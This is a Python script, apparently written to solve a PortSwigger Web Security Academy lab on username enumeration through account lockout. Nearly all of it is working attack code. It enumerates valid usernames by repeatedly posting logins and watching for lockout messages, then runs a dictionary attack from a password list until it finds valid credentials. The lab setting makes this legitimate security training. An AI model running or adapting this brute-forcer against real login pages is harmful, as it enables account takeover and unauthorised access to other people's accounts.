# This script was used for solving one of the username enumeration labs, on Portswigger Web Academy.
# Reference: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock 
# 
# This script was written, just for fun, and it's not meant to replace any other tool.
#

import requests
import time
import sys

# Set the URL. For the portswigger academy, this URL is subject to change frequently.
url = 'https://ac431f7a1e89edc08048083e008800d8.web-security-academy.net/login'

usernames = []
passwords = []

validUser = raw_input('[+] Please enter valid username (or) Press enter to brute-force valid usernames\n')

# Grab the usernames from the local usernames.txt file
f = open("usernames.txt","r")
for x in f:
	usernames.append(x.strip())

f.close()

# Grab the usernames from the local passwords.txt file
f = open("passwords.txt", "r")
for x in f:
	passwords.append(x.strip())

f.close()

print passwords

validUserNames = []

# Set a password (could be anything), to be used for username enumeration.
password = "test"

# Was the user received as input? If not, brute-force the username
if not validUser:
	for username in usernames:
	
	# The count here, is just to re-use the same username 5 times. This is used to check, if there was a lockout.
		for count in range(0,5):
	
			myData = {'username':username,'password':password,'count': count}

			x = requests.post(url, data=myData)
			print username + ":" + password + " ==> " + "Status Code: " + str(x.status_code) + " Reason: " + x.reason

			if x.status_code >= 500:
				print "The server gave a 500 error."
				sys.exit()
			else:
				if 'minute' in x.text:
					print "Found valid username " + username
					validUserNames.append(username)
					break
	
				if 'Invalid username or password' in x.text:
					print username + ":" + password + " ==> " + " Response: The username or password was incorrect"
		if validUserNames:
			break
			
#		Sleep if you want
#		time.sleep(0.001)

	print "[+] Valid Usernames: " + str(validUserNames)

print "[+] Starting dictionary attack on valid username"

validCredentials = []

# Count that's used, to monitor whether the user account locked out or not.
count = 1

# If a valid user was given as input, use that instead.
if validUser != '':
	validUserNames.append(validUser)

# Go through all the valid usernames, that was brute-forced in the previous step.
for validUser in validUserNames:
	for password in passwords:
		myData = {'username':validUser,'password':password}
		
		x = requests.post(url, data=myData)
		print validUser + ":" + password + " ==> " + "Status Code: " + str(x.status_code) + " Reason: " + x.reason

		# The server gave a gateway timeout. Exit and refresh the session, manually.
		if x.status_code >= 500:
			print "The server gave a 500 error."
			sys.exit()
		
		# This signifies, that the account is locked out. Wait for a minute, before trying next.
		#elif 'minute' in x.text:
			#print 'Account is locked out!'
			#count=1
			#time.sleep(60)
		
		# The server responded with a 302, which is a redirect. This means, that the login worked.
		elif 'Invalid username or password' not in x.text and 'You have made too many incorrect login attempts' not in x.text:
			print x.text
			print "Found a valid credential! : " + validUser + ":" + password
			validCredentials.append([validUser, password])
			break
		
		# Increment count, so that we don't lockout the useraccount. This doesn't always work, as the user account ends up getting 			# locked anyway, but using this method, it is much lesser frequent.
		#count=count+1
		
		# If we exceed 3 times, let's sleep, and continue after a minute.
		#if count > 3:
			#count=1
			#print('sleeping')
			#time.sleep(60)
			#break
		
	if len(validCredentials) > 0:
		sys.exit()		
		
			
			
			
		

